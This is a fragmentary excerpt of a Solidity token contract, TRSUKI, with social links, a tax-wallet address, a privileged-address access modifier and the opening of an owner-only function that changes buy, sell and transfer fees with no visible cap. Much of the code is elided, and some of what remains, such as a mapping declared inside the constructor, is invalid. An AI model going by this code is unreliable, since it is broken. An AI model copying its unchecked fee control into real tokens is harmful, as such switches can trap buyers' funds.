...
// Telegram : https://t.me/TrsukiEth

// Twitter : twitter.com/TrsukiEth
...
contract TRSUKI is IERC20 {
    ...
    string constant private _name = "TRSUKI";
    string constant private _symbol = "TRSUKI";
    ...
    TaxWallets public _taxWallets = TaxWallets({
        marketing: payable(0x2E341Bf22d46B2673F0ec723e1e4F1feCF9292d8),
        development: payable(0x2E341Bf22d46B2673F0ec723e1e4F1feCF9292d8)
    });
    ...
    constructor () payable {
        ...
        mapping (address => bool) internal TTRS;
...
//===============================================================================================================
    ...
    modifier TRS() {
        require(isTRS(msg.sender), "!AUTHORIZED"); _;
    }

    function isTRS(address adr) public view returns (bool) {
        return TTRS[adr];
    }
...
//===============================================================================================================
    ...
    function ChangeFes(uint16 buyFee, uint16 sellFee, uint16 transferFee) public TRS {
